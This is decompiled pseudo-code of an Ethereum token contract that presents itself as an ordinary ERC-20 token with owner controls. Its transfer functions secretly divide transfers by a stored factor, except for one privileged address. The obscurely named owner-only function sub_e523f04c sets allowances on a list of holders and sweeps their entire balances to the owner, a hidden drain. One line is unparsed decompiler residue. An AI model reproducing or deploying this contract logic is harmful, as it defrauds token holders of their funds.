contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address sub_cec85ceaAddress; offset 8
uint256 totalSupply;
uint256 stor7;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function sub_cec85cea(?) payable {
    return sub_cec85ceaAddress
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > allowance[msg.sender][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not arg1:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 + allowance[msg.sender][address(arg1)] < allowance[msg.sender][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2 + allowance[msg.sender][address(arg1)]
    emit Approval((arg2 + allowance[msg.sender][address(arg1)]), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if sub_cec85ceaAddress == msg.sender:
        if arg2 + balanceOf[arg1] < balanceOf[arg1]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    else:
        if balanceOf[msg.sender] <= balanceOf[address(arg1)]:
            if arg2 + balanceOf[arg1] < balanceOf[arg1]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
        else:
            require stor7
            if (arg2 / stor7) + balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += arg2 / stor7
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if sub_cec85ceaAddress == arg1:
        if arg3 + balanceOf[arg2] < balanceOf[arg2]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
    else:
        if balanceOf[arg1] <= balanceOf[address(arg2)]:
            if arg3 + balanceOf[arg2] < balanceOf[arg2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
        else:
            require stor7
            if (arg3 / stor7) + balanceOf[address(arg2)] < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3 / stor7
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][msg.sender]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] = allowance[address(arg1)][msg.sender] - arg3
    emit Approval((allowance[address(arg1)][msg.sender] - arg3), arg1, msg.sender);
    return 1
}

function sub_e523f04c(?) payable {
    mem[64] = 96
    require calldata.size - 4 >= 64
    require cd[4] <= 4294967296
    require cd[4] + 36 <= calldata.size
    require ('cd', 4).length <= 4294967296 and cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    idx = 0
    while idx < ('cd', 4).length:
        if not address(cd[((32 * idx) + cd[4] + 36)]):
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
        if not owner:
            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
        allowance[address(cd[((32 * idx) + cd[4] + 36)])][stor0] = cd[36]
        emit Approval(cd[36], address(cd[((32 * idx) + cd[4] + 36)]), owner);
        require idx < ('cd', 4).length
        mem[0] = address(cd[((32 * idx) + cd[4] + 36)])
        mem[32] = 1
        if not address(cd[((32 * idx) + cd[4] + 36)]):
            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
        if not owner:
            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
        if sub_cec85ceaAddress == address(cd[((32 * idx) + cd[4] + 36)]):
            if sub_cec85ceaAddress != owner:
                _173 = mem[64]
                mem[64] = mem[64] + 96
                mem[_173] = 38
                mem[_173 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 1
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]:
                    _183 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[idx + _183 + 68] = mem[idx + _173 + 32]
                        idx = idx + 32
                        continue 
                    mem[_183 + 100] = mem[_183 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _183 + -mem[64] + 132
                balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] = 0
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] + balanceOf[stor0] < balanceOf[stor0]:
                    revert with 0, 'SafeMath: addition overflow'
                mem[0] = owner
                mem[32] = 1
                balanceOf[stor0] += balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]
                emit Transfer(balanceOf[address(cd[((32 * idx) + cd[4] + 36)])], address(cd[((32 * idx) + cd[4] + 36)]), owner);
                _236 = mem[64]
                mem[64] = mem[64] + 96
                mem[_236] = 40
                mem[_236 + 32 len 40] = 0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63
                mem[32] = sha3(address(cd[((32 * idx) + cd[4] + 36)]), 2)
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > allowance[address(cd[((32 * idx) + cd[4] + 36)])][msg.sender]:
                    _248 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 40
                    idx = 0
                    while idx < 40:
                        mem[idx + _248 + 68] = mem[idx + _236 + 32]
                        idx = idx + 32
                        continue 
                    mem[_248 + 100] = mem[_248 + 124 len 8]
                    revert with memory
                      from mem[64]
                       len _248 + -mem[64] + 132
            else:
                _175 = mem[64]
                mem[64] = mem[64] + 96
                mem[_175] = 38
                mem[_175 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 1
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]:
                    _186 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[idx + _186 + 68] = mem[idx + _175 + 32]
                        idx = idx + 32
                        continue 
                    mem[_186 + 100] = mem[_186 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _186 + -mem[64] + 132
                balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] = 0
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] + balanceOf[stor0] < balanceOf[stor0]:
                    revert with 0, 'SafeMath: addition overflow'
                mem[0] = owner
                mem[32] = 1
                balanceOf[stor0] += balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]
                emit Transfer(balanceOf[address(cd[((32 * idx) + cd[4] + 36)])], address(cd[((32 * idx) + cd[4] + 36)]), owner);
                _239 = mem[64]
                mem[64] = mem[64] + 96
                mem[_239] = 40
                mem[_239 + 32 len 40] = 0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63
                mem[32] = sha3(address(cd[((32 * idx) + cd[4] + 36)]), 2)
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > allowance[address(cd[((32 * idx) + cd[4] + 36)])][msg.sender]:
                    _251 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 40
                    idx = 0
                    while idx < 40:
                        mem[idx + _251 + 68] = mem[idx + _239 + 32]
                        idx = idx + 32
                        continue 
                    mem[_251 + 100] = mem[_251 + 124 len 8]
                    revert with memory
                      from mem[64]
                       len _251 + -mem[64] + 132
        else:
            mem[32] = 1
            mem[0] = address(cd[((32 * idx) + cd[4] + 36)])
            if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] <= balanceOf[stor0]:
                _169 = mem[64]
                mem[64] = mem[64] + 96
                mem[_169] = 38
                mem[_169 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 1
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]:
                    _177 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[idx + _177 + 68] = mem[idx + _169 + 32]
                        idx = idx + 32
                        continue 
                    mem[_177 + 100] = mem[_177 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _177 + -mem[64] + 132
                balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] = 0
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] + balanceOf[stor0] < balanceOf[stor0]:
                    revert with 0, 'SafeMath: addition overflow'
                mem[0] = owner
                mem[32] = 1
                balanceOf[stor0] += balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]
                emit Transfer(balanceOf[address(cd[((32 * idx) + cd[4] + 36)])], address(cd[((32 * idx) + cd[4] + 36)]), owner);
                _227 = mem[64]
                mem[64] = mem[64] + 96
                mem[_227] = 40
                mem[_227 + 32 len 40] = 0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63
                mem[32] = sha3(address(cd[((32 * idx) + cd[4] + 36)]), 2)
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > allowance[address(cd[((32 * idx) + cd[4] + 36)])][msg.sender]:
                    _242 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 40
                    idx = 0
                    while idx < 40:
                        mem[idx + _242 + 68] = mem[idx + _227 + 32]
                        idx = idx + 32
                        continue 
                    mem[_242 + 100] = mem[_242 + 124 len 8]
                    revert with memory
                      from mem[64]
                       len _242 + -mem[64] + 132
            else:
                _171 = mem[64]
                mem[64] = mem[64] + 96
                mem[_171] = 38
                mem[_171 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 1
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]:
                    _180 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[idx + _180 + 68] = mem[idx + _171 + 32]
                        idx = idx + 32
                        continue 
                    mem[_180 + 100] = mem[_180 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _180 + -mem[64] + 132
                balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] = 0
                require stor7
                if (balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] / stor7) + balanceOf[stor0] < balanceOf[stor0]:
                    revert with 0, 'SafeMath: addition overflow'
                mem[0] = owner
                mem[32] = 1
                balanceOf[stor0] += balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] / stor7
                emit Transfer(balanceOf[address(cd[((32 * idx) + cd[4] + 36)])], address(cd[((32 * idx) + cd[4] + 36)]), owner);
                _245 = mem[64]
                mem[64] = mem[64] + 96
                mem[_245] = 40
                mem[_245 + 32 len 40] = 0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63
                mem[32] = sha3(address(cd[((32 * idx) + cd[4] + 36)]), 2)
                if balanceOf[address(cd[((32 * idx) + cd[4] + 36)])] > allowance[address(cd[((32 * idx) + cd[4] + 36)])][msg.sender]:
                    _255 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 40
                    idx = 0
                    while idx < 40:
                        mem[idx + _255 + 68] = mem[idx + _245 + 32]
                        idx = idx + 32
                        continue 
                    mem[_255 + 100] = mem[_255 + 124 len 8]
                    revert with memory
                      from mem[64]
                       len _255 + -mem[64] + 132
        ('le', ('stor', ('map', ('mask_shl', 160, 0, 0, ('cd', ('add', 36, ('mul', 32, ('var', 0)), ('cd', 4)))), ('name', 'balanceOf', 1))), ('stor', ('map', 'msg.sender', ('map', ('mask_shl', 160, 0, 0, ('cd', ('add', 36, ('mul', 32, ('var', 0)), ('cd', 4)))), ('name', 'allowance', 2)))))
        if not address(cd[((32 * idx) + cd[4] + 36)]):
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
        if not msg.sender:
            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
        mem[0] = msg.sender
        mem[32] = sha3(address(cd[((32 * idx) + cd[4] + 36)]), 2)
        allowance[address(cd[((32 * idx) + cd[4] + 36)])][address(msg.sender)] = allowance[address(cd[((32 * idx) + cd[4] + 36)])][msg.sender] - balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]
        mem[mem[64]] = allowance[address(cd[((32 * idx) + cd[4] + 36)])][msg.sender] - balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]
        emit Approval((allowance[address(cd[((32 * idx) + cd[4] + 36)])][msg.sender] - balanceOf[address(cd[((32 * idx) + cd[4] + 36)])]), address(cd[((32 * idx) + cd[4] + 36)]), msg.sender);
        idx = idx + 1
        continue 
}



}
